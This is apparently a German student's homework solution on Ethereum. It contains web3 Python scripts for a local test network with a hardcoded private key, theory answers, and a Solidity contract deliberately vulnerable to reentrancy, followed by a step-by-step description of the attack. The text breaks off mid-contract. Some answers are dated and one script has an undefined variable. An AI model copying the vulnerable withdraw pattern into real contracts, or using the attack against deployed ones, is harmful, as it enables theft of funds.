\documentclass[german]{../uebung}

\usepackage{uebung-meta}
\usepackage{graphicx}
\usepackage[
	colorlinks=true,
	urlcolor=blue,
	linkcolor=green
]{hyperref}
\usepackage{listings}

\assignment{6}

\sloppy

\begin{document}

\begin{exercise}{1}
    \textbf{a)}
    \begin{figure}[h]
        \centering
        \includegraphics*[scale=.5]{Aufgabe6a.png}
        \caption{Verbindung: In den Screens befindet sich auch die walletadresse "0x30dbfde92c0d62584597094c436fc241278dbbdc"}
    \end{figure}

    \textbf{b)}

    a: Block-ID von Block 100: 0xae520d34ba0fc2febb5c178fa38edd13253bae0453d642ce9eeda839de62bc55

    b: siehe Code

    c: Der Block mit den meisten Transaktionen ist Block 8912 mit 2377 Transaktionen.

    d: Signierte Transaktion: 0xf9084e8...f434582

    Transaktion gesendet, TX Hash: 0x3aceb780483a821b8440272c5a10abf1e288d0f4c6ce5d0af3559d63e4d15f87
    Transaktion bestätigt in Block 49087

    e:
    blockNumber: 1968
    blockNumber: 1969
    blockNumber: 1970
    blockNumber: 1971
    blockNumber: 1972
    CountAppended: 2; blockNumber: 1973
    blockNumber: 1973
    blockNumber: 1974
    blockNumber: 1975
    blockNumber: 1976
    blockNumber: 1977
    blockNumber: 1978
    blockNumber: 1979
    blockNumber: 1980
    blockNumber: 1981
    blockNumber: 1982
    blockNumber: 1983
    blockNumber: 1984
    blockNumber: 1985
    blockNumber: 1986
    blockNumber: 1987
    CountAppended: 3; blockNumber: 1988
    CountAppended: 4; blockNumber: 1988
    CountAppended: 5; blockNumber: 1988
    CountAppended: 6; blockNumber: 1988
    CountAppended: 7; blockNumber: 1988
    CountAppended: 8; blockNumber: 1988
    CountAppended: 9; blockNumber: 1988
    CountAppended: 10; blockNumber: 1988
    CountAppended: 11; blockNumber: 1988
    CountAppended: 12; blockNumber: 1988
    CountAppended: 13; blockNumber: 1988
    CountAppended: 14; blockNumber: 1988
    CountAppended: 15; blockNumber: 1988
    CountAppended: 16; blockNumber: 1988
    CountAppended: 17; blockNumber: 1988
    CountAppended: 18; blockNumber: 1988
    CountAppended: 19; blockNumber: 1988
    CountAppended: 20; blockNumber: 1988
    CountAppended: 21; blockNumber: 1988
    CountAppended: 22; blockNumber: 1988
    CountAppended: 23; blockNumber: 1988
    CountAppended: 24; blockNumber: 1988
    CountAppended: 25; blockNumber: 1988
    CountAppended: 26; blockNumber: 1988
    CountAppended: 27; blockNumber: 1988
    CountAppended: 28; blockNumber: 1988
    CountAppended: 29; blockNumber: 1988
    CountAppended: 30; blockNumber: 1988
    CountAppended: 31; blockNumber: 1988
    CountAppended: 32; blockNumber: 1988
    CountAppended: 33; blockNumber: 1988
    CountAppended: 34; blockNumber: 1988
    CountAppended: 35; blockNumber: 1988
    CountAppended: 36; blockNumber: 1988
    CountAppended: 37; blockNumber: 1988
    CountAppended: 38; blockNumber: 1988
    CountAppended: 39; blockNumber: 1988
    CountAppended: 40; blockNumber: 1988
    CountAppended: 41; blockNumber: 1988
    CountAppended: 42; blockNumber: 1988
    CountAppended: 43; blockNumber: 1988
    CountAppended: 44; blockNumber: 1988
    CountAppended: 45; blockNumber: 1988
    CountAppended: 46; blockNumber: 1988
    CountAppended: 47; blockNumber: 1988
    CountAppended: 48; blockNumber: 1988
    CountAppended: 49; blockNumber: 1988
    CountAppended: 50; blockNumber: 1988
    CountAppended: 51; blockNumber: 1988
    CountAppended: 52; blockNumber: 1988
    CountAppended: 53; blockNumber: 1988
    CountAppended: 54; blockNumber: 1988
    CountAppended: 55; blockNumber: 1988
    CountAppended: 56; blockNumber: 1988
    CountAppended: 57; blockNumber: 1988
    CountAppended: 58; blockNumber: 1988
    CountAppended: 59; blockNumber: 1988
    CountAppended: 60; blockNumber: 1988
    CountAppended: 61; blockNumber: 1988
    CountAppended: 62; blockNumber: 1988
    CountAppended: 63; blockNumber: 1988
    CountAppended: 64; blockNumber: 1988
    blockNumber: 1988

    Gefundene Public Keys bis Block 1989:

    0x81DA2B20434f175fbC391276b0FE47a25e17cc3A
    0x16395AA7373D2b8E70fBd7fF671d2e9EC684220b
    0xb44ab6a5087E9AC57E38659e83b79beb136bFDE4
    0x6Ee0Ce28B6c2ef19310199D10b28a655F81B67cd
    0xe57996010135d0f95DA34a9561dC8A2C8Df19806
    0x681B3263D82F765e7C1606FD27b6F2c71C0c738E
    0x86f1bC295207edD8E924a45A80025cA585c2aEF3
    0x5c1f1C66420C345a9308E193079C0b697df83C2b
    0xF2ECC24164Fe2A17CCBf7B8C9530851C1c2539BD
    0x7e6eCEcC8c25Af9d99048857852FC7c267E05FF1
    0x56E1811E87AD2451AEFA1F2012BCc52E00f4aE8d
    0xaADAf8f57411f98FCa791AfCfE3A2Af18ad9693D
    0x766C767d43301327562710B439CdEd28631520A4
    0xdfAA017794201F06B9106a6F4e9e74Ea4a3289f6
    0x9f2058ab760b64F8FF65A0905235e6DE271BEd54
    0x58F65D396299840651EBEb1922b4118aDd18bCA3
    0xe036D218355E37a554788364fAc2387E9c8620e3
    0x1DdE567676Fb709F87055dCDe8392Fac565764D3
    0x1A4781Ac9f4e8db7e9e8f61A85732fd4ECf64031
    0xB005753eb31C9a2f8D6811F84f662a43525F70c9
    0x6599f3443736584CF65d5a75ec50Aca8BACf4b24
    0x9fa66d087003a56136621d62a6Debe7174A0D785
    0x389387a51F2bd0D3480342edEb70F3718B1ccD85
    0x0978f6BC202E9A6077027EC3fE6679996459c882
    0x82A70Da82Ba256FB659A4C5542f0794ddF017Da9
    0x8fE3e103d19c6219FEb245A08D5247Ee789cbA44
    0x71bd80D967b430A401371b0b5fC23523A8fe63E7
    0x2C640fe01e02F6bEd4fB3Cf3FFEe80a0069bCA2f
    0x9ede8ED921698D1529556C0f3e097881AA7FE6C4
    0x1BBb703782b6B1A36B0ED58804e0ABa689C6B7a4
    0x23a296660c564543328E2E9A41d2B53ea0B52957
    0x561742d8Fc1296e7B1095849ccFb319A58E6fF3E
    0x67dec5f473aC868D8dD7FA5222923cdB52518BfA
    0x7C535356a1D720E1E750F113B6ad3db64DE7d84A
    0xcf175b4ECde6d9474d53F00f435853617e486E52
    0xFAb7709C92dA2Dd76B42DEc3fEb060F6983a3016
    0x15defFB50BCc5f2174eafe9c65a123e15F08aA67
    0xD4a55C82E3deCefC505B9f708E8E5326318D32dF
    0xFF794b6F41b8E128c281fD1c3E0E2dbdd198cCDc
    0xF66E2f02fFd7A2d6e5B09ffb527B537020C22a8d
    0xbb18c37B8207b4C39afc5Dcfcc7bfCDa9913f88F
    0x6A7BdCb04e142Bf05E3136CdA8A5027b83859E1D
    0xC4410Dc3c242F15615c840e2F155cA5c2D816e0c
    0xA1242DfE34c231378012d4F8Ce6d321a28e9E3e2
    0x34a66Cfb692f39E3cDb97265b7a7Bcb3Dd201B78
    0x9f0fe1f12C29f67FDe312155e5F6ffF1dE13Ad10
    0x13e6712B9Aa220F1BcBC1D81096a529715063b30
    0xB420BB9BED92797353a003eC5bC9e45102e38674
    0xB9a44c20cCb20Ef40823b3513696699aDCFdAa0e
    0xfC757A1D9D6800AC2389E40e7FA7aA038CBb3AD4
    0xBcEFB96E92511338177Bfef682cBf559ceB99da5
    0x0e273c0A2a75F6d464f36A9Dd3d7b69E8Eb896D1
    0x56Cb4746444b7294e49deBC5DbFe653BB97C666D
    0x295A929A48F005Df98c6053c353E993136E4D2b4
    0x2711BF4003286C29ea19435dA9E1821f2969Ab34
    0xadDb17678b075C4a71D3d978cD641D2be7d7F1Aa
    0xa08b415eff78b8380aFa8D9A4C3362C618918ff3
    0xA599F151298F30fCC398cf5DE37EbCd226791DfF
    0x7F56f5520667F0991e7aCb84C10fD22DB1978528
    0xE66E1eEbaBb70872Aa14F9e909720144c99ca792
    0x66674892C2614F07f5E703672c4fe6b7F53bF4Ce
    0xa00E40582f008b5f74C4db8F3Cf2D3236F420350
    0x8508f82987c8eF3Faae9D4b2D8F8d35423D8c7af
    0x86108547aBa62C591B8CD3a6439321B67207357f
    0xd305430197eCf633d86b63ed18528CEc201aF9F9

    code für b bis e:
    \begin{verbatim}
    from web3 import Web3
    import time
    from eth_account.messages import encode_defunct
    from eth_account import Account
    import json

    # Verbindung zur lokalen Geth-Node herstellen
    node_url = "http://127.0.0.1:9001"
    web3 = Web3(Web3.HTTPProvider(node_url, request_kwargs={'timeout': 60}))

    # Überprüfen, ob die Verbindung erfolgreich ist
    if not web3.is_connected():
        print("Fehler bei der Verbindung zur Geth-Node")
        exit()

    def sixC():
        max_tx_block = None
        max_tx_count = 0

        # Aktuelle Blocknummer abrufen
        latest_block = web3.eth.block_number
        print(f"Neuester Block: {latest_block}")

        # Durchsuche alle Blöcke von 0 bis zum neuesten Block
        for block_number in range(latest_block + 1):
            block = web3.eth.get_block(block_number)
            tx_count = len(block.transactions)

            if tx_count > max_tx_count:
                max_tx_block = block_number
                max_tx_count = tx_count

        print(f"Der Block mit den meisten Transaktionen ist Block 
        {max_tx_block} mit {max_tx_count} Transaktionen.")
    # sixC()
    def sixD():
        # Adressen und private Schlüssel der Wallets
        source_address = "0x30DBFde92c0d62584597094C436FC241278DbbDc"
        private_key = "da5718ac70daadfe1faf1e55d27dbebc917e7f88430b6b89
        2f967712c029802a"

        # PGP Public Key als Daten
        pgp_public_key = """-----BEGIN PGP PUBLIC KEY BLOCK-----
        Version: Keybase OpenPGP v1.0.0
        Comment: https://keybase.io/crypto

        xo0EZn1JlQEEAL0k9Op+qBTq5TWMMfX5ngCRONs4rqQqzxCdzfpj5Av/TM7vaGHq
        gllWfbpXqmM6ydjt5rUc1vE64+8nLjx4SqcqFZOUEvrFKtQdU2bDMU20eDosMO3D
        bsX/OVkvP7EjrC/RGyKvly52IyD8tnoJ4ZceNY3Hlh208Tvxxfi2PyADABEBAAHN
        IUx1aXMgKFRlc3QpIDxsdWdvZXJkZXNAZ21haWwuY29tPsKtBBMBCgAXBQJmfUmV
        AhsvAwsJBwMVCggCHgECF4AACgkQXUf8kpI75mKulwQAmJZXE1WBpVTs0NTl1BWh
        qchDAx41ikzm72fvHfsb54OEnPT3fBU2pohf0z7t8wFJlNVa0FCCRx43m1GMnpdq
        gcjOiVl0sTM4i68jn1W8cS3H57BaL2469ClUw7TIlVPrFTPvA7FhqaqanDsfSilR
        FIVfg0Zq4gbU60AmWPQIQYnOjQRmfUmVAQQA0fxaV5f/Mmv7Jz8JBopLe9WxfBMq
        gGtvY2uyjzeJzzooZf18YAuN/17kWiWDg4ZLocNqkX4Zlchk0fIoOnBwhMY+cktP
        T4zuYWGCFTtVWhKGzqcCJTl5rP+2Cz5pLm+EpQS+2DxXCSaZguwkk7FbxNu66Hy8
        zKMIHl5d0JcLg1UAEQEAAcLAgwQYAQoADwUCZn1JlQUJDwmcAAIbLgCoCRBdR/yS
        kjvmYp0gBBkBCgAGBQJmfUmVAAoJEJUcPLJW7UI5t9ED/A4sx0Rdp5V9XIFkdI5S
        szPFTsfEVP7bYmAQCh+5wZPveUpmvMEuYpjDK4CtLqknv1nPfKgxBPlHf6JJyZkg
        S40//En3VbKqll4pJSRekHCXdSQrqWh4aD3bdJFhvf+gC3st6VM0WXKm32ga2Bp4
        ISS9RTxIl3di3B0504KgiSrNXGgD/iAlZ2pEmM1QBuLn/TmqGUdVYBr4pxbE1CCm
        ZZfQylsKJwizJd6G8rSTxNIbchPttW9pmpGKjvgShlT2E9yae2kKcoij0oItVEB+
        hGZY3+NpfPXNNFi+9+MOXHx0vcAjHr0+OPn8DN+rtnJX2QMjP7W751LdGmx3VhgJ
        edAxJfMOzo0EZn1JlQEEAMAq7pXcuxq960kEf9w1zaiA+HIRa8MBdx/4jNipViMw
        K2vHZLeH9I6kE+669t3ROT1G1Mv+RzAjxNydix4+M7hrapTxqX624mpy7Kxp7mN7
        aaCFyQ6ZZpA+4RNE3atfZGo7jB99KHdziepYIlEcKdQTZP7agH3zVme1zmWJeD2b
        ABEBAAHCwIMEGAEKAA8FAmZ9SZUFCQ8JnAACGy4AqAkQXUf8kpI75mKdIAQZAQoA
        BgUCZn1JlQAKCRC+dHiydyL56kzgBACoYfZ4nOXPmVctg/ZCCvZXdxevf/jG7+GF
        DVQReSDDX88QZXV9Am6pTeFCZULCh4b8V8QzJnqRTE1YJjFK2QfTLoXI2bxRXClr
        748y49JVy6PwTfaJ4SnpmkPRr9vAvYUjubG8fzPTa6Wl2xRB/OhgQQ6kcuznfADJ
        IpRcADjerRXpA/9S7m+8k0uredmv7gsp6Z2DFqSO+p/iRazbShOcs144VnziPPR4
        1846FbDe77vZMs6sTVzwLFgYZkx8l7sWkyVtSPEV2ScKljIPLTCC6cfEWwGnp198
        tkrOpbSKvgEaClsCePsfVFQ5zI7K7eDNMy0gBHgApka3DxyVvcSoRgvOwA==
        =F4E+
        -----END PGP PUBLIC KEY BLOCK-----"""

        # Nonce für die Transaktion abrufen
        nonce = web3.eth.get_transaction_count(source_address)

        # Betrag und Gaslimit festlegen (hier wird kein Ether übertragen, nur Daten)
        amount = 0
        gas_limit = 300000  # Erhöhtes Gaslimit, da die Datenmenge groß ist
        gas_price = web3.to_wei(50, 'gwei')

        # Erstellen der Transaktion
        tx = {
            'nonce': nonce,
            'to': source_address,  # Die Transaktion wird an dich selbst gesendet
            'value': amount,
            'gas': gas_limit,
            'gasPrice': gas_price,
            'data': Web3.to_hex(text=Silas),
            'chainId': 108
        }

        # Signieren der Transaktion
        signed_tx = web3.eth.account.sign_transaction(tx, private_key)
        print(f"Signierte Transaktion: {signed_tx.rawTransaction.hex()}")

        # Senden der Transaktion
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f'Transaktion gesendet, TX Hash: {tx_hash.hex()}')

        # Bestätigung der Transaktion abwarten
        receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        print(f'Transaktion bestätigt in Block {receipt.blockNumber}')
    # sixD()
    def sixE():
        def extract_public_key(tx):
            signed_message = encode_defunct(hexstr=tx['hash'].hex())
            signature = {
                'v': tx['v'],
                'r': web3.to_hex(tx['r']),
                's': web3.to_hex(tx['s'])
            }
            public_key = Account.recover_message(signed_message, 
            vrs=(signature['v'], signature['r'], signature['s']))
            return public_key

        # Liste, um die Public Keys zu speichern
        public_keys = []

        # Endblocknummer (kann durch den aktuellen Block oder einen 
        anderen spezifischen Block ersetzt werden)
        end_block_number = web3.eth.block_number

        # Durchlaufen der Blöcke
        for block_number in range(0, end_block_number + 1):
            block = web3.eth.get_block(block_number, full_transactions=True)
            for tx in block.transactions:
                try:
                    public_key = extract_public_key(tx)
                    public_keys.append(public_key)
                except Exception as e:
                    print(f"Fehler beim Extrahieren des Public Keys für Transaktion 
                    {tx['hash'].hex()}: {e}")

        # Alle gefundenen Public Keys anzeigen
        print(f"Gefundene Public Keys bis Block {end_block_number}:")
        for pk in public_keys:
            print(pk)
    sixE()
    def sixB():
        # Adressen und private Schlüssel der Wallets
        source_address = "0x30DBFde92c0d62584597094C436FC241278DbbDc"
        target_address = "0x3b5A5B160EeaD4918bd2D132aBf8665d019F861D"
        private_key = "da5718ac70daadfe1faf1e55d27dbebc917e7f88430b6b892f967712c029802a"

        # Adresse aus dem privaten Schlüssel berechnen
        calculated_address = web3.eth.account.from_key(private_key).address

        if calculated_address.lower() != source_address.lower():
            print(f"Fehler: Die berechnete Adresse {calculated_address} stimmt nicht 
            mit der angegebenen Quelladresse {source_address} überein.")
            exit()

        print(f"Berechnete Adresse aus dem privaten Schlüssel: {calculated_address}")

        # Kontostand überprüfen
        balance = web3.eth.get_balance(source_address)
        print(f"Kontostand von {source_address}: {web3.from_wei(balance, 'ether')} Ether")

        # Betrag für jede Transaktion (in Wei)
        amount = web3.to_wei(0.01, 'ether')  # Beispiel: 0.01 Ether pro Transaktion

        # Gaspreis und Gaslimit festlegen
        gas_price = web3.to_wei(50, 'gwei')  # Beispiel: 50 Gwei
        gas_limit = 21000  # Standard für einfache ETH-Transaktionen

        # Chain ID für Replay Protection (z.B. 15 für ein privates Netzwerk)
        chain_id = 108

        def send_transaction(nonce):
            tx = {
                'nonce': nonce,
                'to': target_address,
                'value': amount,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'chainId': chain_id
            }

            print(f"Erstellen der Transaktion: {tx}")
            signed_tx = web3.eth.account.sign_transaction(tx, private_key)
            print(f"Signierte Transaktion: {signed_tx.rawTransaction.hex()}")
            
            try:
                tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
                print(f'Transaktion gesendet, TX Hash: {tx_hash.hex()}')
            except ValueError as e:
                print(f"Fehler beim Senden der Transaktion: {e}")

        # Senden von 1000 Transaktionen
        nonce = web3.eth.get_transaction_count(source_address)
        for i in range(1000):
            try:
                send_transaction(nonce + i)
            except Exception as e:
                print(f"Fehler bei Transaktion {i+1}: {e}")
            # Optional: kleine Pause zwischen den Transaktionen
            time.sleep(0.1)

        print("1000 Transaktionen erfolgreich gesendet")

    \end{verbatim}
\end{exercise}

\begin{exercise}{2}

    \textbf{a}
    Eine Einheit, um die Menge an Rechenleistung zu messen, die für die Ausführung von Operationen wie Transaktionen oder Smart Contracts, benötigt wird. Jede Anweisung in der Ethereum Virtual Machine hat bestimmte Gas Costs, die die benötigte Rechenleistung und Speicherplatz widerspiegelt. Benutzer müssen die Gasgebühr bezahlen, die proportional zur Menge des verbrauchten Gases ist, um sicherzustellen, dass Miner für ihre Arbeit entschädigt werden und das Netzwerk vor Spam geschützt wird.

    \textbf{b}
    Wenn für eine Transaktion zu viel Gas bereitgestellt wurde, wird das nicht verbrauchte Gas dem Absender der Transaktion zurückerstattet. Das bedeutet, dass der Absender lediglich für das tatsächlich verbrauchte Gas zahlt, und das überschüssige Gas wird auf sein Konto zurückgebucht.

    \textbf{c}
    STOP: 0 Gas\\
    PUSH1 0xff: 3 Gas\\
    PUSH4 0x00000000: 3 Gas\\
    JUMP: 8 Gas\\
    SHA3: 30 Gas + 6 Gas pro Wort (256 Bit) des Eingabedatums\\
    CALL: 700 Gas für den Basispreis + zusätzliche Kosten abhängig von der Komplexität der Operation und der Menge des übertragenen ETH\\
    CREATE: 32000 Gas + zusätzliche Kosten für die Speicherplatznutzung des erstellten Contracts\\
    SELFDESTRUCT (if no new account is created): 5000 Gas
\end{exercise}

\begin{exercise}{3}
    Ethereum nutzt ein kontobasiertes Ledger-System, im Gegensatz zum UTXO-basierten Ledger von Bitcoin. In einem kontobasierten Ledger verwaltet Ethereum den Zustand jedes Kontos weltweit, einschließlich der Salden und des Nonce-Werts (Zählwert).

    Double-Spend-Verhinderung in Ethereum:

    **Kontostand:**

    - Jede Transaktion, die von einem Ethereum-Konto ausgeht, reduziert den Kontostand um den entsprechenden Betrag der Transaktion plus die Gasgebühren.
    - Sobald das Guthaben für eine Transaktion verwendet wurde, steht es nicht mehr zur Verfügung, wodurch ein Double-Spend verhindert wird.

    **Nonce:**

    - Jede Transaktion enthält einen Nonce-Wert, der eine eindeutige, fortlaufende Nummer ist, die bei jeder neuen Transaktion von einem Konto um eins erhöht wird.
    - Der Nonce-Wert stellt sicher, dass jede Transaktion einzigartig ist und in der richtigen Reihenfolge verarbeitet wird.
    - Eine Transaktion mit einem bereits verwendeten Nonce-Wert wird vom Netzwerk abgelehnt. Ebenso wird eine Transaktion mit einem zu hohen oder zu niedrigen Nonce-Wert zurückgewiesen.
    - Dies verhindert, dass eine bereits ausgegebene Transaktion erneut ausgeführt wird.

    Durch diese Mechanismen wird sichergestellt, dass jeder Ether nur einmal ausgegeben werden kann, und es wird effektiv ein Double-Spend verhindert. Das System der Nonce-Werte zusammen mit den Kontoständen gewährleistet die Integrität und Sicherheit der Transaktionen im Ethereum-Netzwerk.
\end{exercise}

\begin{exercise}{4}
    \item \textbf{Jede Pure-Funktion ist eine View-Funktion.}

    \textbf{Richtig.}
    \newline
    \textit{Erklärung:} Eine Pure-Funktion garantiert, dass sie keine Zustandsänderungen vornimmt und keine Daten aus dem Zustand liest. Da eine View-Funktion ebenfalls keine Zustandsänderungen vornimmt, aber den Zustand lesen kann, kann jede Pure-Funktion als eine spezialisierte Form einer View-Funktion betrachtet werden.

    \item \textbf{Eine Transaktion, die eine View-Funktion aufruft, kostet kein Gas, da sie den Zustand nicht ändert.}

    \textbf{Falsch.}
    \newline
    \textit{Erklärung:} View-Funktionen können tatsächlich ohne Gasverbrauch aufgerufen werden, aber nur im Kontext eines \texttt{eth\_call}, das heißt, wenn sie lokal und nicht als Transaktion ausgeführt werden. Wenn sie jedoch als Teil einer tatsächlichen Transaktion aufgerufen werden, kostet die Transaktion selbst Gas, auch wenn die View-Funktion keinen Zustand ändert.

    \item \textbf{In Ethereum kann ein Smart Contract keine Ether erhalten, der keine Funktionen hat, die als zahlungspflichtig deklariert sind.}

    \textbf{Falsch.}
    \newline
    \textit{Erklärung:} Ein Smart Contract kann Ether erhalten, selbst wenn er keine als zahlungspflichtig deklarierten Funktionen hat, durch die Verwendung der Fallback-Funktion. Wenn ein Vertrag keine spezifische Funktion für eingehende Zahlungen definiert, kann die Fallback-Funktion genutzt werden, um Ether zu empfangen.

    \item \textbf{Die Standard-Datentypen \texttt{int} und \texttt{uint} von Solidity können jeweils $2^{32}$ verschiedene Werte enthalten.}

    \textbf{Falsch.}
    \newline
    \textit{Erklärung:} Die Standard-Datentypen \texttt{int} und \texttt{uint} in Solidity sind 256-Bit-Werte, es sei denn, sie sind spezifisch als \texttt{int32} oder \texttt{uint32} deklariert. Ein 256-Bit-Wert kann $2^{256}$ verschiedene Werte enthalten. \texttt{int32} und \texttt{uint32} können jeweils $2^{32}$ verschiedene Werte enthalten, aber das ist nicht der Standardtyp in Solidity.

    \item \textbf{Wenn \texttt{msg.sender == tx.origin}, dann wurde dieser Code direkt von einem fremden Konto aufgerufen und nicht von einem anderen Smart Contract.}

    \textbf{Richtig.}
    \newline
    \textit{Erklärung:} \texttt{tx.origin} ist die Adresse des Accounts, der die Transaktion ursprünglich initiiert hat. \texttt{msg.sender} ist die Adresse des Accounts oder Vertrags, der die Funktion direkt aufruft. Wenn \texttt{msg.sender} gleich \texttt{tx.origin} ist, bedeutet dies, dass die Funktion direkt von einem externen Konto und nicht durch einen anderen Vertrag aufgerufen wurde.
\end{exercise}

\begin{exercise} {5}
    \textbf{a) Beschreibe die Funktionen des Contracts}
    Der Smart Contract \texttt{Dangerous} verfügt über zwei Hauptfunktionen: \texttt{depositMoney} und \texttt{withdraw}. Im Folgenden wird jede Funktion detailliert beschrieben:

    \subsection*{depositMoney()}

    \textbf{Beschreibung:} Diese Funktion ermöglicht es einem Benutzer, Ether in den Smart Contract einzuzahlen.

    \textbf{Funktionsweise:}
    \begin{itemize}
        \item Die Funktion ist als \texttt{payable} deklariert, was bedeutet, dass sie Ether empfangen kann.
        \item Beim Aufruf der Funktion wird der gesendete Betrag (\texttt{msg.value}) dem \texttt{deposits} Mapping unter der Adresse des Absenders (\texttt{msg.sender}) hinzugefügt.
    \end{itemize}

    \textbf{Code:}
    \begin{verbatim}
function depositMoney() public payable {
    deposits[msg.sender] += msg.value;
}
\end{verbatim}

    \subsection*{withdraw(uint amount)}

    \textbf{Beschreibung:} Diese Funktion ermöglicht es einem Benutzer, einen bestimmten Betrag an Ether aus dem Smart Contract abzuheben.

    \textbf{Funktionsweise:}
    \begin{itemize}
        \item Die Funktion prüft zunächst, ob der Absender (\texttt{msg.sender}) genügend Guthaben in seinem \texttt{deposits} Eintrag hat, um den gewünschten Betrag abzuheben. Dies geschieht mittels der \texttt{require} Anweisung.
        \item Anschließend versucht die Funktion, den angegebenen Betrag an Ether an den Absender zu senden. Dies erfolgt mit \texttt{msg.sender.call.value(amount)()}. Sollte der Transfer fehlschlagen, wird die Transaktion rückgängig gemacht (\texttt{revert}).
        \item Bei erfolgreichem Transfer wird der abgehobene Betrag vom \texttt{deposits} Eintrag des Absenders abgezogen.
    \end{itemize}

    \textbf{Code:}
    \begin{verbatim}
function withdraw(uint amount) public {
    require(deposits[msg.sender] >= amount);
    if (!msg.sender.call.value(amount)()) {
        revert();
    }
    deposits[msg.sender] -= amount;
}
\end{verbatim}

    \textbf{b) Was genau passiert in Zeile 13?}
    In Zeile 13 des Dangerous Smart Contracts wird ein kritischer und potenziell riskanter Vorgang durchgeführt. Hier ist die betreffende Zeile:

    \begin{verbatim}
    if (!msg.sender.call.value(amount)()) {
        revert();
    }
    \end{verbatim}

    \subsection*{Detaillierte Erklärung:}

    \textbf{msg.sender.call.value(amount)():}

    \begin{itemize}
        \item \textbf{Kontext:} \texttt{msg.sender} ist die Adresse des Kontos, das die \texttt{withdraw} Funktion aufruft.
        \item \textbf{call Methode:} Die \texttt{call} Methode wird verwendet, um Ether an \texttt{msg.sender} zu senden. Diese Methode ist sehr flexibel und kann genutzt werden, um beliebige Funktionen auf einer anderen Adresse aufzurufen.
        \item \textbf{value(amount):} Diese spezielle Verwendung von \texttt{call} besagt, dass eine bestimmte Menge an Ether (\texttt{amount}) an \texttt{msg.sender} gesendet werden soll.
        \item \textbf{Die Klammern () am Ende:} Diese leeren Klammern deuten darauf hin, dass keine zusätzlichen Daten oder Funktionen aufgerufen werden, sondern nur Ether übertragen werden soll.
    \end{itemize}

    \subsection*{Fehlerbehandlung:}

    \begin{itemize}
        \item \textbf{Negation \texttt{!}:} Das \texttt{!} vor dem Ausdruck negiert das Ergebnis des \texttt{call}. Die \texttt{call} Methode gibt \texttt{true} zurück, wenn der Ether-Transfer erfolgreich ist, und \texttt{false}, wenn er fehlschlägt.
        \item \textbf{if-Bedingung:} Die \texttt{if}-Anweisung prüft also, ob der \texttt{call} fehlgeschlagen ist.
        \item \textbf{revert():} Wenn der \texttt{call} fehlgeschlagen ist (das heißt, wenn \texttt{msg.sender.call.value(amount)()} \texttt{false} zurückgibt), wird die Transaktion mit \texttt{revert()} rückgängig gemacht. Dies bedeutet, dass alle Änderungen, die während der Transaktion vorgenommen wurden, einschließlich der Veränderung des \texttt{deposits} Mappings, zurückgesetzt werden.
    \end{itemize}

    \subsection*{Rationale und Risiken:}

    \textbf{Warum \texttt{call} verwenden?:} \texttt{call} ist eine sehr allgemeine Methode, die in älteren Versionen von Solidity oft verwendet wurde, um Ether zu senden. Heutzutage wird jedoch die Verwendung von \texttt{send} oder \texttt{transfer} bevorzugt, da sie sicherer und leichter zu handhaben sind.

    \textbf{c) Der Contract ist anfällig für einen sogenannten Reentrancy-Angriff. Beschreibe das Problem.}
    Ein Reentrancy-Angriff tritt auf, wenn ein bösartiger Smart Contract in der Lage ist, wiederholt Funktionen eines Ziel-Smart Contracts aufzurufen, bevor der ursprüngliche Aufruf abgeschlossen ist. Im Fall des \texttt{Dangerous} Contracts kann ein Angreifer durch geschicktes Nutzen der \texttt{call} Methode und wiederholtem Aufruf der \texttt{withdraw} Funktion mehr Ether abheben, als ihm tatsächlich zusteht.

    \subsection*{Ablauf des Angriffs}

    \subsubsection*{Initialer Aufruf:}
    \begin{itemize}
        \item Ein Angreifer hat bereits eine Einzahlung auf den \texttt{Dangerous} Contract gemacht, sodass sein Guthaben (\texttt{deposits[angreiferAdresse]}) einen gewissen Betrag enthält.
        \item Der Angreifer startet den Angriff, indem er die \texttt{withdraw} Funktion aufruft, um eine bestimmte Menge Ether abzuheben.
    \end{itemize}

    \subsubsection*{Reentrancy während des \texttt{call}:}
    \begin{itemize}
        \item Innerhalb der \texttt{withdraw} Funktion erreicht die Ausführung die Zeile \texttt{if (!msg.sender.call.value(amount)())}.
        \item Der \texttt{call} sendet Ether an \texttt{msg.sender}, der in diesem Fall der Angreifer-Contract ist.
        \item Sobald der Angreifer-Contract die Ether erhält, kann er eine Funktion in seinem eigenen Code auslösen, die erneut die \texttt{withdraw} Funktion des \texttt{Dangerous} Contracts aufruft, bevor die ursprüngliche \texttt{withdraw} Funktion abgeschlossen ist.
    \end{itemize}

    \subsubsection*{Wiederholter Aufruf vor dem Abschluss:}
    \begin{itemize}
        \item Da der ursprüngliche \texttt{withdraw} Aufruf noch nicht abgeschlossen ist, wurde die Zeile \texttt{deposits[msg.sender] -= amount;} noch nicht ausgeführt.
        \item Der Angreifer-Contract ruft also die \texttt{withdraw} Funktion erneut auf, während sein Guthaben im \texttt{deposits} Mapping noch nicht verringert wurde.
        \item Dies führt dazu, dass der Angreifer erneut den gleichen Betrag Ether abheben kann.
    \end{itemize}

    \subsubsection*{Mehrfache Abhebungen:}
    \begin{itemize}
        \item Dieser Prozess kann wiederholt werden, sodass der Angreifer in der Lage ist, mehr Ether abzuheben, als er ursprünglich eingezahlt hat.
    \end{itemize}

    \subsubsection*{Ende des Angriffs:}
    \begin{itemize}
        \item Der Angriff endet, wenn entweder der Angreifer entscheidet, den Angriff zu beenden, oder der Contract keine weiteren Mittel mehr hat, um abzuheben.
        \item Schließlich wird die ursprüngliche \texttt{withdraw} Funktion abgeschlossen und das Guthaben im \texttt{deposits} Mapping verringert, aber zu diesem Zeitpunkt hat der Angreifer bereits viel mehr Ether abgehoben.
    \end{itemize}

    \textbf{d)}
    Um einen Reentrancy-Angriff auszuführen, erstellen wir einen bösartigen Smart Contract, der die Schwachstelle im \texttt{Dangerous} Contract ausnutzt. Hier sind die Schritte, die wir befolgen müssen:

    \begin{enumerate}
        \item Erstellen des \texttt{Dangerous} Contracts.
        \item Erstellen des Angreifer-Contracts.
        \item Angriff ausführen, um alle Ether aus dem \texttt{Dangerous} Contract zu entwenden.
    \end{enumerate}

    Hier ist der komplette Code für beide Contracts:

    \subsection*{1. Dangerous Contract}

    \begin{verbatim}
pragma solidity ^0.4.24;

contract Dangerous {
    mapping(address => uint) public deposits;

    function depositMoney() public payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(deposits[msg.sender] >= amount);
        if (!msg.sender.call.value(amount)()) {
            revert();
        }
        deposits[msg.sender] -= amount;
